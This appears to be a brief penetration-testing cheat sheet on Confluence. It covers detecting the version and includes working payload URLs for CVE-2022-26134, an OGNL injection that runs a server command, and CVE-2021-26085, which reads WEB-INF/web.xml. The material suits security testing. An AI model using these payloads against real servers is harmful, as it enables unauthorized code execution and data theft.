# Confluence Common Bugs

## Introduction
What would you do if you came across a website that uses Confluence?

## How to Detect
Try to HTTP request to `https://example.com/login.action?os_destination=%2F` and there is a form login

1. Find the related CVE by checking Confluence version
* How to find the Confluence version

Try to request to `https://example.com/login.action?os_destination=%2F` and then check the source code. You will find this line `<meta name="ajs-version-number" content="8.20.9">` so 8.20.9 is the Confluence version. If you found outdated Confluence version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-6258/Atlassian-Confluence.html)

Some example CVE:

- CVE-2022-26134 (Remote Code Execution)
```
https://example.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
```

- CVE-2021-26085 (Arbitrary File Read)
```
https://example.com/s/test/_/;/WEB-INF/web.xml
```